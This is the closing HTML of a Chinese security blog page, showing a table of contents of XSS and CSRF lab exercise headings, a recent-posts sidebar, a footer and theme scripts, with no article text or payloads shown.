class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB%EF%BC%9A%E5%B0%86-XSS-%E5%8F%8D%E5%B0%84%E5%88%B0%E5%B8%A6%E6%9C%89%E5%B0%96%E6%8B%AC%E5%8F%B7%E7%9A%84-HTML-%E7%BC%96%E7%A0%81%E7%9A%84%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">2.3.1.</span> <span class="toc-text">LAB：将 XSS 反射到带有尖括号的 HTML 编码的属性中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%B0%86xss%E5%AD%98%E5%82%A8%E5%88%B0%E5%B8%A6%E6%9C%89%E5%8F%8C%E5%BC%95%E5%8F%B7HTML%E7%BC%96%E7%A0%81%E7%9A%84%E9%94%9A%E7%82%B9%E5%B1%9E%E6%80%A7%E4%B8%AD"><span class="toc-number">2.3.2.</span> <span class="toc-text">LAB:将xss存储到带有双引号HTML编码的锚点属性中</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E8%A7%84%E8%8C%83%E9%93%BE%E6%8E%A5%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8BXSS"><span class="toc-number">2.3.3.</span> <span class="toc-text">LAB:规范链接标签中的反射型XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8JavaScript%E5%88%A9%E7%94%A8XSS"><span class="toc-number">2.4.</span> <span class="toc-text">在JavaScript利用XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%88%E6%AD%A2%E7%8E%B0%E6%9C%89%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.1.</span> <span class="toc-text">终止现有脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-Reflected-XSS-into-a-JavaScript-string%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%A2%AB%E8%BD%AC%E4%B9%89"><span class="toc-number">2.4.2.</span> <span class="toc-text">LAB:Reflected XSS into a JavaScript string单引号和反斜杠被转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JS%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">2.4.3.</span> <span class="toc-text">JS字符串逃逸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%8D%95%E5%BC%95%E5%8F%B7%E8%A2%ABhtml%E7%BC%96%E7%A0%81%E6%83%85%E5%86%B5%E4%B8%8B%E7%9A%84JS%E4%B8%ADxss%E5%88%A9%E7%94%A8"><span class="toc-number">2.4.4.</span> <span class="toc-text">LAB:单引号被html编码情况下的JS中xss利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%88%A9%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BD%AC%E4%B9%89%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">2.4.5.</span> <span class="toc-text">LAB: 利用反斜杠转义单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%9C%A8-JavaScript-URL-%E4%B8%AD%E5%8F%8D%E6%98%A0%E4%BA%86-XSS%EF%BC%8C%E5%B9%B6%E9%98%BB%E6%AD%A2%E4%BA%86%E4%B8%80%E4%BA%9B%E5%AD%97%E7%AC%A6"><span class="toc-number">2.4.6.</span> <span class="toc-text">LAB:在 JavaScript URL 中反映了 XSS，并阻止了一些字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8HTML%E7%BC%96%E7%A0%81"><span class="toc-number">2.4.7.</span> <span class="toc-text">使用HTML编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E4%BD%BF%E7%94%A8%E5%B0%96%E6%8B%AC%E5%8F%B7%E5%92%8C%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%B0%86-XSS-%E5%AD%98%E5%82%A8%E5%88%B0%E4%BA%8B%E4%BB%B6%E4%B8%AD-HTML-%E7%BC%96%E7%A0%81%E5%92%8C%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E5%8F%8D%E6%96%9C%E6%9D%A0%E8%BD%AC%E4%B9%89"><span class="toc-number">2.4.8.</span> <span class="toc-text">LAB:使用尖括号和双引号将 XSS 存储到事件中 HTML 编码和单引号和反斜杠转义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript%E6%A8%A1%E6%9D%BF%E6%96%87%E5%AD%97%E4%B8%AD%E7%9A%84XSS"><span class="toc-number">2.4.9.</span> <span class="toc-text">JavaScript模板文字中的XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-JavaScript%E6%A8%A1%E6%9D%BF%E7%9A%84xss%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.10.</span> <span class="toc-text">LAB:JavaScript模板的xss注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-AngularJS%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E4%B8%AD%E8%BF%87%E6%BB%A4%E4%BA%86%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%8F%8D%E5%B0%84%E5%9E%8Bxss"><span class="toc-number">2.4.11.</span> <span class="toc-text">LAB:AngularJS沙盒逃逸中过滤了字符串的反射型xss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%B8%A6%E6%9C%89AngularJS%E6%B2%99%E7%AE%B1%E8%BD%AC%E4%B9%89%E5%92%8CCSP%E7%9A%84%E5%8F%8D%E5%B0%84%E5%BC%8FXSS"><span class="toc-number">2.4.12.</span> <span class="toc-text">LAB:带有AngularJS沙箱转义和CSP的反射式XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-DOM-XSS-in-document-write-sink-using-source-location-search-inside-a-select-element"><span class="toc-number">2.4.13.</span> <span class="toc-text">LAB:DOM XSS in document.write sink using source location.search inside a select element</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AngularJS%E4%B8%AD%E7%9A%84DOM-XSS"><span class="toc-number">2.4.14.</span> <span class="toc-text">AngularJS中的DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-XSS-%E7%BB%93%E5%90%88%E5%8F%8D%E6%98%A0%E5%92%8C%E5%AD%98%E5%82%A8%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.</span> <span class="toc-text">DOM XSS 结合反映和存储的数据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%8F%8D%E5%B0%84%E5%9E%8BDOM-XSS"><span class="toc-number">2.5.1.</span> <span class="toc-text">LAB:反射型DOM XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LAB-%E5%AD%98%E5%82%A8%E5%9E%8BDOM-XSS"><span class="toc-number">2.5.2.</span> <span class="toc-text">LAB:存储型DOM XSS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B%E6%8E%A5%E6%94%B6%E5%99%A8%E4%BC%9A%E5%AF%BC%E8%87%B4-DOM-XSS-%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">2.6.</span> <span class="toc-text">哪些接收器会导致 DOM-XSS 漏洞？</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">跨站请求伪造（CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#LAB-%E6%B2%A1%E6%9C%89%E9%98%B2%E5%BE%A1%E7%9A%84-CSRF-%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.1.</span> <span class="toc-text">LAB:没有防御的 CSRF 漏洞</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/10/16/awd-pre/" title="awd_pre"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/659736426530110839.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="awd_pre"/></a><div class="content"><a class="title" href="/2023/10/16/awd-pre/" title="awd_pre">awd_pre</a><time datetime="2023-10-16T02:37:02.496Z" title="Updated 2023-10-16 10:37:02">2023-10-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/20/Golang/" title="Golang"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/226234848940601817.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Golang"/></a><div class="content"><a class="title" href="/2023/08/20/Golang/" title="Golang">Golang</a><time datetime="2023-10-04T04:06:48.390Z" title="Updated 2023-10-04 12:06:48">2023-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/28/ctfnote/" title="ctfnote"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/11474402688974935838.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfnote"/></a><div class="content"><a class="title" href="/2022/02/28/ctfnote/" title="ctfnote">ctfnote</a><time datetime="2023-09-24T04:21:36.169Z" title="Updated 2023-09-24 12:21:36">2023-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/09/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="常用姿势"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/888416576461888238.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常用姿势"/></a><div class="content"><a class="title" href="/2022/04/09/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/" title="常用姿势">常用姿势</a><time datetime="2023-08-30T07:48:21.662Z" title="Updated 2023-08-30 15:48:21">2023-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/15/AES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/" title="AES加密原理及代码实现"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/807f9fee5edc4ba29560bb596f5ec173.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AES加密原理及代码实现"/></a><div class="content"><a class="title" href="/2023/08/15/AES%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/" title="AES加密原理及代码实现">AES加密原理及代码实现</a><time datetime="2023-08-29T14:53:19.338Z" title="Updated 2023-08-29 22:53:19">2023-08-29</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://css0k-1308151975.cos.ap-beijing.myqcloud.com/12112613631567912103.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By css_0k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>